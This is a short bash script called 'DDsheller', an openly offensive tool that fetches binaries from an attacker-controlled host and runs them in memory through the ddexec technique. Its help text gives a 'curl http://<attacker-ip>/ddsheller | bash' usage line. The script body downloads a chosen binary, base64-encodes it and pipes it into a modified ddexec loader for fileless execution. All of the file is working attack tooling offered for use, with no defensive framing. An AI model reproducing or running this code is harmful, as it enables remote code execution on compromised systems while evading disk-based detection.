#! /bin/bash
echo "DDsheller"
echo "Author : lLou_"
echo "---"


help () {
   echo ""
   echo "[>] curl -s http://<attacker-ip>/ddsheller | bash -s -- <bin-library> <command>"
   echo "    [~] Every binaries available in the bin library can be used as command"
   echo "    [~] You can use ports using :<port> as for any url"
   echo "    [~] You need arget13's ddexec to be in the bin-library at the path /ddexec"
   echo ""
   exit
}

if [[ $# -le 1 || ! "$(curl -s $1 2>/dev/null)" || ! "$(curl -fs $1/ddexec)" ]]; then help; fi

url=$1
if [[ ! $url =~ "://" ]];then url="http://$url";fi
if [[ ! $url =~ /$ ]];then url="$url/";fi

call=$2
args=${@:2}
d="ddexec"
if [[ ! $(curl -fs $url$call) ]] 2>/dev/null;then echo "[!] Error : $call is not found at $url$call";exit;fi
k=$(curl -fs $url$call | base64 -w0);/bin/bash /dev/stdin $args < <(echo "k=$k" && (curl -s $url$d | sed $'s/read -r bin/bin=$k/g'))
